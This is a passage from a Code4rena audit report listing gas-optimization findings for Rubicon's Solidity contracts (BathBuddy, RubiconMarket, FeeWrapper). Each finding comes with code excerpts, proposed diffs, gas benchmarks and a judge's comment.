*There are 32 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, please see the warden's [full report](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1135).)*

Estimated Gas Saved: `32 * 100 = 3200`.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L568-L571

## [G-06] Avoid emitting storage values
Caching of a state variable replaces each `Gwarmaccess (100 gas)` with a much cheaper stack read. We can avoid unecessary SLOADs by caching storage values that were previously accessed and emitting those cached values.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L232-L242

### Emit `_rewardsDuration` instead of reading from storage.
```solidity
File: contracts/periphery/BathBuddy.sol
232:    function setRewardsDuration(
233:        uint256 _rewardsDuration,
234:        address token
235:    ) external onlyOwner {
236:        require(
237:            block.timestamp > periodFinish[token],
238:            "Previous rewards period must be complete before changing the duration for the new period"
239:        );
240:        rewardsDuration[token] = _rewardsDuration;
241:        emit RewardsDurationUpdated(rewardsDuration[token]); // @audit: unecessary SLOAD, emit _rewardsDuration
242:    }
```
```diff
diff --git a/contracts/periphery/BathBuddy.sol b/contracts/periphery/BathBuddy.sol
index 4aac344..171d14b 100644
--- a/contracts/periphery/BathBuddy.sol
+++ b/contracts/periphery/BathBuddy.sol
@@ -238,7 +238,7 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
             "Previous rewards period must be complete before changing the duration for the new period"
         );
         rewardsDuration[token] = _rewardsDuration;
-        emit RewardsDurationUpdated(rewardsDuration[token]);
+        emit RewardsDurationUpdated(_rewardsDuration);
     }

```

## [G-07] Structs can be packed to use fewer storage slots
The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if values combined are <= 32 bytes). If the variables packed together are retrieved together in functions (more likely with structs) we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a `Gwarmaccess (100 gas)` versus a `Gcoldsload (2100 gas)`.

*There are 2 instances of this issue.*

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L33-L40

## [G-08] State variables can be packed to use fewer storage slots
The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if the values combined are <= 32 bytes). If the variables packed together are retrieved together in functions we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a `Gwarmaccess (100 gas)` versus a `Gcoldsload (2100 gas)`.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L227-L230

### Pack `feeBPS` and `feeTo` into one storage slot to save 1 SLOT (~2000 gas)

`feeBPS` is able to be of type `uint96` without fear of overflowing.

*Both state variables are accessed in `RubiconMarket.buy`*
```solidity
File: contracts/RubiconMarket.sol
227:    uint256 internal feeBPS;
228:
229:    /// @dev This parameter provides the address to which fees are sent
230:    address internal feeTo;
```
```diff
diff --git a/contracts/RubiconMarket.sol b/contracts/RubiconMarket.sol
index 219e915..9f284d1 100644
--- a/contracts/RubiconMarket.sol
+++ b/contracts/RubiconMarket.sol
@@ -223,12 +223,12 @@ contract SimpleMarket is EventfulMarket, DSMath {

     bool locked;

-    /// @dev This parameter is in basis points
-    uint256 internal feeBPS;
-
     /// @dev This parameter provides the address to which fees are sent
     address internal feeTo;

+    /// @dev This parameter is in basis points
+    uint96 internal feeBPS;
+
     bytes32 internal constant MAKER_FEE_SLOT = keccak256("WOB_MAKER_FEE");

     struct OfferInfo {
@@ -1464,7 +1464,7 @@ contract RubiconMarket is MatchingEvents, ExpiringMarket, DSNote {
     }

     function setFeeBPS(uint256 _newFeeBPS) external auth returns (bool) {
-        feeBPS = _newFeeBPS;
+        feeBPS = uint96(_newFeeBPS);
         return true;
     }
```

## [G-09] Rearrange storage variables to pack values more efficiently
`friendshipStarted` and `myBathTokenBuddy` would benefit more from being stored in the same storage slot because they are both retrieved in `rewardPerToken` and `earned`. `frienshipStarted` and `bathHouse` are both retrieved only in the `getReward` function.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L46-L49

*Gas Savings for `notifyRewardAmount`, obtained via protocol's tests: Avg 2000 gas*. 

|        |    Min   |    Max   |   Avg   | # calls  |
| ------ | -------- | -------- | ------- | -------- |
| Before |  -  |  -  |  113455 |    1    |
| After  |  -  |  -  |  111455 |    1    |

```solidity
File: contracts/periphery/BathBuddy.sol
46:    address public owner;
47:    address public myBathTokenBuddy;
48:    address public bathHouse;
49:    bool public friendshipStarted;
```
```diff
diff --git a/contracts/periphery/BathBuddy.sol b/contracts/periphery/BathBuddy.sol
index 4aac344..a05bb11 100644
--- a/contracts/periphery/BathBuddy.sol
+++ b/contracts/periphery/BathBuddy.sol
@@ -44,8 +44,8 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
     // WILL BE BATH HOUSE IS OWNER
     /// BATH TOKEN ONLY ENTRYPOINTs
     address public owner;
-    address public myBathTokenBuddy;
     address public bathHouse;
+    address public myBathTokenBuddy;
     bool public friendshipStarted;
```

## [G-10] Return values from external calls can be cached to avoid unnecessary call
External calls are expensive as they use the `CALL/STATICCALL` opcode (~100 gas). If you are calling the same external function more than once you should cache the return value to avoid an unnecessary `CALL/STATICCALL`.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L121-L135

### Cache `IERC20(myBathTokenBuddy).totalSupply()`

*Gas Savings for `BathBuddy.claimRewards`, obtained via protocol's tests: Avg 1798 gas*. 

|        |    Min   |    Max   |   Avg   | # calls  |
| ------ | -------- | -------- | ------- | -------- |
| Before |  -  |  -  |  265601 |    1    |
| After  |  -  |  -  |  263803 |    1    |

```solidity
File: contracts/periphery/BathBuddy.sol
121:    function rewardPerToken(address token) public view returns (uint256) {
122:        require(friendshipStarted, "I have not started a bathToken friendship");
123:
124:        if (IERC20(myBathTokenBuddy).totalSupply() == 0) { // @audit: 1st external call
125:            return rewardsPerTokensStored[token];
126:        }
127:        return
128:            rewardsPerTokensStored[token].add(
129:                lastTimeRewardApplicable(token)
130:                    .sub(lastUpdateTime[token])
131:                    .mul(rewardRates[token])
132:                    .mul(1e18)
133:                    .div(IERC20(myBathTokenBuddy).totalSupply()) // @audit: 2nd external call
134:            );
135:    }
```
```diff
diff --git a/contracts/periphery/BathBuddy.sol b/contracts/periphery/BathBuddy.sol
index 4aac344..b5a9de7 100644
--- a/contracts/periphery/BathBuddy.sol
+++ b/contracts/periphery/BathBuddy.sol
@@ -120,8 +120,9 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {

     function rewardPerToken(address token) public view returns (uint256) {
         require(friendshipStarted, "I have not started a bathToken friendship");
-
-        if (IERC20(myBathTokenBuddy).totalSupply() == 0) {
+
+        uint256 _totalSupply = IERC20(myBathTokenBuddy).totalSupply();
+        if (_totalSupply == 0) {
             return rewardsPerTokensStored[token];
         }
         return
@@ -130,7 +131,7 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
                     .sub(lastUpdateTime[token])
                     .mul(rewardRates[token])
                     .mul(1e18)
-                    .div(IERC20(myBathTokenBuddy).totalSupply())
+                    .div(_totalSupply)
             );
     }
```

## [G-11] Multiple accesses of a mapping/array should use a storage pointer
Caching a mapping's value in a storage pointer when the value is accessed multiple times saves ~40 gas per access due to not having to perform the same offset calculation every time. Help the Optimizer by saving a storage variable's reference instead of repeatedly fetching it.

To achieve this, declare a storage pointer for the variable and use it instead of repeatedly fetching the reference in a map or an array. As an example, instead of repeatedly calling `offers[id]`, save its reference via a storage pointer: `OfferInfo storage _offer = offers[id]` and use the pointer instead.

*There are 43 instances of this issue*.

## [G-12] Use assembly for value transfer and success check
If we are not using the return data from a low level `.call`, we can avoid creating extra stack variables and storing return data into memory by using assembly to access the `CALL` opcode and specify `0` for both the return data offset and the return data size.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L118-L119

```solidity
File: contracts/utilities/FeeWrapper.sol
118:        (bool OK, ) = payable(_feeTo).call{value: _feeAmount}("");
119:		require(OK, "ETH transfer failed");
```
```diff
diff --git a/contracts/utilities/FeeWrapper.sol b/contracts/utilities/FeeWrapper.sol
index 88d6cfe..173e2ee 100644
--- a/contracts/utilities/FeeWrapper.sol
+++ b/contracts/utilities/FeeWrapper.sol
@@ -115,8 +115,13 @@ contract FeeWrapper {
         require(msg.value == _totalAmount, "FeeWrapper: not enough ETH sent");

         // transfer fee to the 3rd party protocol
-        (bool OK, ) = payable(_feeTo).call{value: _feeAmount}("");
-               require(OK, "ETH transfer failed");
+        assembly {
+            let OK := call(gas(), _feeTo, _feeAmount, 0, 0, 0, 0)
+            if iszero(OK) {
+                revert(0, 0)
+            }
+        }
         _msgValue = msg.value - _feeAmount;
     }
 }
```

## GasReport output, with all optimizations applied

*Note: see [GasReport](https://github.com/code-423n4/2023-04-rubicon-findings/blob/main/data/JCN-G.md#gasreport-output-with-all-optimizations-applied) for more details.*

**[daoio (Rubicon) acknowledged](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1135#issuecomment-1547366847)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1135#issuecomment-1585479569):**
 > Best report for having benchmarked with the setup.
> 
> For G-02, a lot of wardens pointed out replacing the boolean `locked` to a uint one. As it's an upgrade from V1 to V2, it can only be changed to `uint8` to preserve the storage layout. Furthermore, I tested it out and found that oddly, gas costs increased.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
